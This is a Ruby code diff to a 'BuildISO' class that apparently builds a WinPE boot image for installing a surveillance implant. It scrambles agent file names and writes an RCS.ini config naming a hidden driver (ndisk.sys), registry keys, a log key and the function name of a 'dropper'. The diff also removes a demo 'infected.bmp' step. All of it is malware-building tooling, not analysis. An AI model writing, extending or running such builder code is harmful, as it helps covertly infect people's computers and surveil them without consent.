@@ -26,6 +26,7 @@ class BuildISO < Build
     trace :debug, "Build: generate: #{params}"
 
     names = {}
+    funcnames = []
 
     params['platforms'].each do |platform|
       build = Build.factory(platform.to_sym)
@@ -42,7 +43,10 @@ class BuildISO < Build
       end
       build.scramble
 
-      names = build.scrambled.dup if platform == 'windows'
+      if platform == 'windows'
+        names = build.scrambled.dup
+        funcnames = build.funcnames.dup
+      end
 
       # copy the scrambled files in our directories
       # TODO: driver removal
@@ -50,8 +54,6 @@ class BuildISO < Build
         FileUtils.mkdir_p(path("winpe/RCSPE/files/#{platform.upcase}"))
         FileUtils.cp(File.join(build.tmpdir, v), path("winpe/RCSPE/files/#{platform.upcase}/" + v))
       end
-
-      FileUtils.cp(File.join(build.tmpdir, 'demo_image'), path("winpe/RCSPE/files/#{platform.upcase}/infected.bmp")) if params['demo']
 
       build.clean
     end
@@ -62,9 +64,6 @@ class BuildISO < Build
     end
 
     key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
-
-    # calculate the function name for the dropper
-    funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
 
     # write the ini file
     File.open(path('winpe/RCSPE/RCS.ini'), 'w') do |f|
@@ -89,7 +88,7 @@ class BuildISO < Build
       f.puts "HOLDREG=#{names[:oldreg]}"
       f.puts "HSYS=ndisk.sys"
       f.puts "HKEY=#{key}"
-      f.puts "FUNC=" + funcname
+      f.puts "FUNC=" + funcnames[8]
       f.puts "MASK=#{params['dump_mask']}"
     end
 
